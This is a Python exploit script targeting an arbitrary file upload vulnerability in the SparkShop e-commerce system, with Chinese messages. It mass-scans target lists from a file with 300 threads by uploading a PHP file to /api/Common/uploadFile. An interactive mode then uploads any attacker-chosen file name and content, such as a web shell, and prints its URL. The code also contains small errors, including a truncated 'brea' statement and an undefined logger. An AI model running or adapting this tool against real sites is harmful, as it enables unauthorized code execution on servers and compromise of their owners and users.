import argparse, requests, os, sys, re, logging,json
from multiprocessing.dummy import Pool


def banner():
    test = """
                  _    _____ _                 
                 | |  /  ___| |                
 _ __   __ _ _ __| | _\ `--.| |__   ___  _ __  
| '_ \ / _` | '__| |/ /`--. \ '_ \ / _ \| '_ \ 
| |_) | (_| | |  |   </\__/ / | | | (_) | |_) |
| .__/ \__,_|_|  |_|\_\____/|_| |_|\___/| .__/ 
| |                                     | |    
|_|                                     |_|    

                                   author:sanhua
                                   date:2024-09-03
                                   version:1.0
"""
    print(test)


def main():
    banner()
    parser = argparse.ArgumentParser(description="南京星源图科技_SparkShop_任意文件上传漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')
    args = parser.parse_args()

    if args.url and not args.file:
        # poc(args.url)
        if poc(args.url):  # 修改的地方：确保 poc 返回 True 时才调用 exp
            exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(300)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")  # 修改的地方：更正 Usage 信息


def poc(target):
    if not target.startswith('http://') and not target.startswith('https://'):
        target = 'http://' + target  # 修改的地方：确保 target 是一个完整的 URL
    url = target + "/api/Common/uploadFile"
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR"
    }
    data = "------WebKitFormBoundaryj7OlOPiiukkdktZR\r\nContent-Disposition: form-data; name=\"file\"; filename=\"1.php\"\r\n\r\n<?php echo \"hello world\";?>\r\n------WebKitFormBoundaryj7OlOPiiukkdktZR--\r\n"

    try:
        response = requests.post(url, headers=headers, data=data, timeout=10,verify=False)
        if response.status_code == 200 and 'upload success' in response.text:
            print(f"[+] {target} 存在文件上传漏洞")
            with open('result1.txt', 'a',encoding='utf-8') as f:
                f.write(target + '\n')
            return True
        else:
            print(f"[-] {target} 不存在文件上传漏洞")
    except Exception as e:
        print(f"[!] 请求 {target} 时发生错误: {e}")

def exp(target):
    payload = "/api/Common/uploadFile"
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR"
    }
    while True:
        filename = input('请输入文件名：')
        code = input('请输入文件的内容：')
        data = '------WebKitFormBoundaryj7OlOPiiukkdktZR\r\nContent-Disposition: form-data; name=\"file\";filename=\"' + f'{filename}' + '\"\r\n\r\n' + f'{code}' + '\r\n------WebKitFormBoundaryj7OlOPiiukkdktZR--'
        if filename == 'q' or code == 'q':
            logger.info("正在退出,请等候……")
            brea
        res1 = requests.post(target + payload, headers=headers, data=data, timeout=10, verify=False)
        if res1.status_code == 200 and 'upload success' in res1.text:
            try:
                json_start = res1.text.find('{')
                if json_start != -1:
                    json_start = res1.text[json_start:]
                    data = json.loads(json_start)
                    url = data['data']['url']
                    url1 = url.replace('\\', '')
                    print(f'{filename}上传成功,请访问{url1}')
                    break
                else:
                    print(f"[-]{target}不存在文件上传漏洞")
            except Exception as e:
                print(f"[!] 请求 {target} 时发生错误: {e}")
        else:
            print(f"[-]{target}不存在文件上传漏洞")


if __name__ == '__main__':
    main()